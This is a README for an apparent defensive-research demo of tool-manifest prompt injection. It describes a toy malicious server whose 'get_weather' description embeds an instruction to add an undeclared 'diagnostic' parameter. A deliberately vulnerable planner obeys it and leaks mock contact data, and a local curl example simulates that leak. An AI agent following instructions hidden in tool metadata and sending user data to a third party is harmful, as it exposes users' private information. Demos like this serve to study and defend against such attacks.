**Agentic AI Safety — Prompt-Injection Demo & Run Flow**

This repository is a compact defensive-research demo showing how an attacker-controlled tool manifest can attempt prompt-injection and covertly exfiltrate context if an LLM-based planner trusts tool metadata.

**Repository files (key)**
- `malicious_server.py`: Toy FastAPI server that serves a `MANIFEST` and records any undeclared parameters received at `/invoke`. The `get_weather` description intentionally contains an embedded instruction that asks for a `diagnostic` parameter.
- `llm_planner_agent.py`: Example agent that fetches the manifest, calls `get_contacts`, and runs a very small simulated planner. The planner intentionally demonstrates vulnerable behavior (concatenating tool descriptions into a prompt and following injected instructions).
- `naive_agent.py`: (Optional) another example agent in the workspace demonstrating naive behavior.
- `requirements.txt`: Python dependencies for running the demo.

**Attack flow (what this demo shows)**
- Agent fetches the manifest from `/manifest`.
- Agent obtains user data (mock PII) via `get_contacts`.
- Planner concatenates tool descriptions into a system prompt and, due to the injected text, adds an undeclared `diagnostic` parameter containing user context when calling `get_weather`.
- `malicious_server.py` records the undeclared `diagnostic` parameter under `/captures` (attacker view).

**Run this demo (Windows `cmd.exe`)**
1. (Optional) create and activate a virtual environment and install dependencies:

```bat
python -m venv venv
venv\Scripts\activate.bat
pip install -r requirements.txt
```

2. Start the malicious server (default: `127.0.0.1:8000`):

```bat
python malicious_server.py
```

3. In a second terminal, run the planner/agent to execute the attack flow:

```bat
python llm_planner_agent.py
```

4. Observe the attacker captures (in a third terminal or after the run):

```bat
curl http://127.0.0.1:8000/captures
```

Expected behavior: `llm_planner_agent.py` will call `get_contacts` (returning mock PII), then the vulnerable planner will include a `diagnostic` parameter containing that context when invoking `get_weather`. The malicious server will log and expose the undeclared parameter under `/captures`.

**Quick `curl` examples**
- View manifest:

```bat
curl http://127.0.0.1:8000/manifest
```

- Simulate a planner invocation that leaks the `diagnostic` field:

```bat
curl -X POST http://127.0.0.1:8000/invoke -H "Content-Type: application/json" -d "{\"tool\": \"get_weather\", \"params\": {\"location\": \"Bangkok\", \"diagnostic\": {\"recent_contacts\": [{\"name\": \"Alice\",\"email\": \"alice@mock.local\"}]}}}"
```


